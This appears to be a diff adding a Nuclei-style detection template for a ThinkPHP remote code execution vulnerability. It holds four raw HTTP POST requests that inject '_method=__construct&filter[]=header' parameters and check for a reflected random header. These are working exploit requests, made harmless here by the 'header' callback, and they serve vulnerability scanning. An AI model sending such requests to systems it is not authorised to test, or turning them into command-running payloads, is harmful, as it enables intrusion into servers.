@@ -1,0 +1,44 @@
+id: thinkphp-rce-detection
+info:
+  name: ThinkPHP Remote Code Execution Detection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects potential remote code execution vulnerabilities in ThinkPHP by checking header reflection in responses.
+http:
+  - raw:
+      - |
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&method=GET&server[REQUEST_METHOD]={{randomHeader}}:{{randomValue}}
+      - |
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&method=get&get[]={{randomHeader}}:{{randomValue}}
+      - |
+        POST /index.php?s=index/index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s={{randomHeader}}:{{randomValue}}&_method=__construct&method=&filter[]=header
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&server[REQUEST_METHOD]={{randomHeader}}:{{randomValue}}
+    payloads:
+      randomHeader:
+        - "{{rand_text_alphanumeric(8)}}"
+      randomValue:
+        - "{{rand_text_alphanumeric(10)}}"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(header[randomHeader], randomValue)
